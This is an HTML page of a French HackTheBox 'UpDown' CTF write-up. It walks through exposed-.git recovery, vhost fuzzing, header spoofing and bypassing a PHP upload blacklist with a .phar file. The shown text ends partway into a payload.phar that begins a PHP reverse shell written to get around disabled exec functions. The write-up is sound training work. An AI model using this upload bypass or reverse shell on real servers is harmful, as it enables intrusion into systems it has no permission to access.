@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:conflict]">
+<meta name="description" content="Medium / Linux" />
+<meta name="keywords" content="cybersecurity blog french hacking rami malek, linux, fuzzing, file upload, filters bypass, cve" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/htb/updown/" />
+
+
+    <title>
+        
+            📙 HackTheBox - UpDown :: conflict  — cybersecurity blog
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css" integrity="sha256-JEGDzeGjjgsI&#43;CwReRGBKI&#43;arBzJYYzW9OnncQxXaLo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="📙 HackTheBox - UpDown">
+  <meta itemprop="description" content="Medium / Linux">
+  <meta itemprop="datePublished" content="2023-01-21T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2023-01-21T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1091">
+  <meta itemprop="image" content="/">
+  <meta itemprop="keywords" content="Linux,Fuzzing,File Upload,Filters Bypass,Cve">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="/">
+  <meta name="twitter:title" content="📙 HackTheBox - UpDown">
+  <meta name="twitter:description" content="Medium / Linux">
+
+
+
+    <meta property="og:url" content="/htb/updown/">
+  <meta property="og:site_name" content="conflict">
+  <meta property="og:title" content="📙 HackTheBox - UpDown">
+  <meta property="og:description" content="Medium / Linux">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb&#39;">
+    <meta property="article:published_time" content="2023-01-21T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-01-21T00:00:00+00:00">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Fuzzing">
+    <meta property="article:tag" content="File Upload">
+    <meta property="article:tag" content="Filters Bypass">
+    <meta property="article:tag" content="Cve">
+    <meta property="og:image" content="/">
+      <meta property="og:see_also" content="/htb/broscience/">
+      <meta property="og:see_also" content="/htb/photobomb/">
+      <meta property="og:see_also" content="/htb/shoppy/">
+      <meta property="og:see_also" content="/htb/ambassador/">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-01-21 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">-</span>
+            <span class="logo__text ">
+                cnf409</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#527ea9;
+                   animation-duration:0.8s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/contact/">Contact</a></li><li><a href="/htb/">HackTheBox</a></li><li><a href="/posts/">Posts</a></li><li><a href="/series/">Series</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/htb/updown/">📙 HackTheBox - UpDown</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h3 id="table-of-contents">Table of contents</h3>
+<hr>
+<ul>
+<li>
+<p><a href="/htb/updown/#recon">Recon</a></p>
+</li>
+<li>
+<p><a href="/htb/updown/#foothold">Foothold</a></p>
+</li>
+<li>
+<p><a href="/htb/updown/#lateral-move">Lateral Move</a></p>
+</li>
+<li>
+<p><a href="/htb/updown/#privilege-escalation">Privilege Escalation</a></p>
+</li>
+</ul>
+<hr>
+<h1 id="note">Note</h1>
+<p>Deuxième writeup sur HTB, il a lui aussi été fait il y a longtemps donc c&rsquo;est possible que j&rsquo;ai dit des bêtises, et il y a <strong>beaucoup</strong> de screens.</p>
+<p>Néanmoins, c&rsquo;était un room assez sympathique avec une méchanique bien trouvée, je l&rsquo;ai bien aimée.</p>
+<h1 id="recon">Recon</h1>
+<p>Comme d’habitude, on lance:</p>
+<pre tabindex="0"><code>nmap -A siteisup.htb
+</code></pre><p><img alt="2022-12-08-174744_930x1026_scrot" src="https://user-images.githubusercontent.com/77807503/206527826-488caf7c-940b-47c7-8a76-00864772cff0.png"></p>
+<p>Aucun port anormal d’ouvert, on va donc se concentrer sur le site et le résultat du <strong>dirbuster</strong></p>
+<pre tabindex="0"><code>dirb http://siteisup.htb
+</code></pre><p><img alt="2022-12-08-175753_930x1026_scrot" src="https://user-images.githubusercontent.com/77807503/206527923-48203d18-d216-456d-8a4c-ddee1251a001.png"></p>
+<p>Bon là c’est assez évident, le <strong>/.git</strong> a rien à faire ici, donc on va utiliser <code>git-dumper</code> pour récupérer tout les fichiers qui s&rsquo;y trouvent</p>
+<pre tabindex="0"><code>git-dumper http://siteisup.htb/dev/.git/ git/
+</code></pre><p>On se retrouve donc avec ceci</p>
+<p><img alt="2022-12-08-180406_949x511_scrot" src="https://user-images.githubusercontent.com/77807503/206528038-8f13afd8-4545-49c8-8fcc-33529f0fa675.png"></p>
+<p>On affiche la liste des commits faits au repo</p>
+<pre tabindex="0"><code>git log
+</code></pre><p><img alt="2022-12-08-180622_1920x1080_scrot" src="https://user-images.githubusercontent.com/77807503/206528076-8f395db5-a2a8-46e8-ba09-23af28c14d2d.png"></p>
+<p>Il y en a beaucoup, mais le seul qui sort du lot est le “<strong>New technique in header to protect our dev vhost</strong>.”</p>
+<p>Regardons les modifications qu’ont apportées ce commit</p>
+<pre tabindex="0"><code>git show 8812785e31c879261050e72e20f298ae8c43b565
+</code></pre><p>On voit que c’est une modification du <code>.htaccess</code>, qui change les settings du serveur pour que seules les connections avec le header <code>Special-Dev: only4dev</code> soient acceptées</p>
+<p><img alt="2022-12-08-180809_751x369_scrot" src="https://user-images.githubusercontent.com/77807503/206528162-4af06057-14dc-426c-9b21-29a4c197ca1a.png"></p>
+<p>Mais le serveur principal fonctionnait très bien sans ce header, donc le <code>.htacces</code> doit probablement agir sur un sous domaine</p>
+<p>On va donc fuzz les sous domaines</p>
+<pre tabindex="0"><code>ffuf -c -w /usr/share/wfuzz/wordlist/general/common.txt -u &#34;http://siteisup.htb&#34; -H &#34;Host: FUZZ.siteisup.htb&#34; -fs 1131
+</code></pre><p><img alt="2022-12-08-181009_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/206528465-39209d8b-75f6-4fef-8744-8811f5ea0ac6.png"></p>
+<p>Il existe donc un sous domaine: <code>dev.siteisup.htb</code></p>
+<p>Pour s’y rendre, on active le proxy burpsuite, puis on désactive l’intercepter</p>
+<p>On crée ensuite un <em>Match and Replace</em> dans les options du proxy, qui va ajouter le header à toutes nos requêtes</p>
+<p><img alt="2022-12-08-181210_962x1061_scrot" src="https://user-images.githubusercontent.com/77807503/206528696-1e6689a6-3153-4e4f-9368-ef3bc09add13.png"></p>
+<p><code>dev.siteisup.htb</code> est une sorte de panel administrateur, où on peut entrer une liste d’urls à checker</p>
+<p><img alt="2022-12-08-181327_930x1026_scrot" src="https://user-images.githubusercontent.com/77807503/206528979-1cec3862-2861-4c81-a13e-aa5ea37f32c2.png"></p>
+<h1 id="foothold">Foothold</h1>
+<p>Mais c’est surtout un sous domaine dont on a le code source dans le .git, donc on va aller y jeter un oeil</p>
+<p>L’index include juste checker ou le fichier en fonction du lien avec un filtre pour les LFI, on va regarder dans <code>checker</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">b</span><span style="color:#f92672">&gt;</span><span style="color:#66d9ef">This</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">only</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">developers</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">b</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">br</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?page=admin&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Admin</span> <span style="color:#a6e22e">Panel</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;DIRECTACCESS&#34;</span>,<span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>	$page<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;page&#39;</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($page <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/bin|usr|home|var|etc/i&#34;</span>,$page)){
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;.php&#34;</span>);
+</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;checker.php&#34;</span>);
+</span></span><span style="display:flex;"><span>	}	
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>C’est le fichier qui gère l’upload et le check de la liste d’urls, c’est là qu’on verra les eventuels filtres et ce qu’il se passe quand on lui upload un fichier</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># File size must be less than 10kb.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10000</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;File too large!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>        $file <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>];
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check if extension is allowed.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">getExtension</span>($file);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&#34;</span>,$ext)){
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Extension not allowed!&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Create directory to upload our file.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uploads/&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">time</span>())<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($dir)){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mkdir</span>($dir, <span style="color:#ae81ff">0770</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Upload the file.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $final_path <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span>$file;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>], <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>$final_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Read the uploaded file.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $websites <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#a6e22e">file_get_contents</span>($final_path));
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span>($websites <span style="color:#66d9ef">as</span> $site){
+</span></span><span style="display:flex;"><span>                $site<span style="color:#f92672">=</span><span style="color:#a6e22e">trim</span>($site);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#file://#i&#34;</span>,$site) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#data://#i&#34;</span>,$site) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#ftp://#i&#34;</span>,$site)){
+</span></span><span style="display:flex;"><span>                        $check<span style="color:#f92672">=</span><span style="color:#a6e22e">isitup</span>($site);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span>($check){
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;center&gt;</span><span style="color:#e6db74">{</span>$site<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;br&gt;&lt;font color=&#39;green&#39;&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;center&gt;</span><span style="color:#e6db74">{</span>$site<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;br&gt;&lt;font color=&#39;red&#39;&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        }       
+</span></span><span style="display:flex;"><span>                }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;center&gt;&lt;font color=&#39;red&#39;&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Delete the uploaded file.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>($final_path);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>On sait donc que:</p>
+<ul>
+<li>Le fichier qu’on upload ne peut pas faire plus de 10Kb</li>
+<li>Son extention ne doit pas être dans la blacklist</li>
+<li>Quand on upload un fichier, il est stocké dans /uploads</li>
+<li>Il est lu en entier, chaque url est checké puis le fichier est supprimé</li>
+</ul>
+<p>Tout d’abord le premier filtre n’est pas un problème puisque la plupart des reverse shell en php font moins de 10Kb</p>
+<p>Ensuite, le danger des blacklists, c’est oublier une extention, en l’occurence ici, l’extention <strong><strong><strong><strong><strong>.phar</strong></strong></strong></strong></strong> n’est pas blacklist, on va donc pouvoir upload des fichiers php qui seront lus</p>
+<p>Enfin, pour éviter que le fichier soit supprimé directement, on va lui donner une grande quantité d’urls à check, pour que ça prenne plus de temps</p>
+<p>On crée donc notre <strong><strong><strong><strong><strong><strong><strong><strong>payload.phar</strong></strong></strong></strong></strong></strong></strong></strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ebay</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fr</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">t</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">tmall</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">.</span><span style="color:#a6e22e">br</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#ae81ff">360.</span><span style="color:#a6e22e">cn</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sohu</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">amazon</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">jp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">pinterest</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">netflix</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">it</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ru</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">microsoft</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">es</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">wordpress</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">gmw</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">tumblr</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">paypal</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">blogspot</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">imgur</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">stackoverflow</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">aliexpress</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">naver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ok</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ru</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">apple</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">github</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">chinadaily</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">imdb</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">kr</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fc2</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">jd</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">blogger</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#ae81ff">163.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ca</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">whatsapp</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">amazon</span><span style="color:#f92672">.</span><span style="color:#a6e22e">in</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">office</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">tianya</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">id</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Upload reverse-shell, bypass exec(), shell_exec(), system(), fsockopen(), passthru()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>$descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>),  
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>),
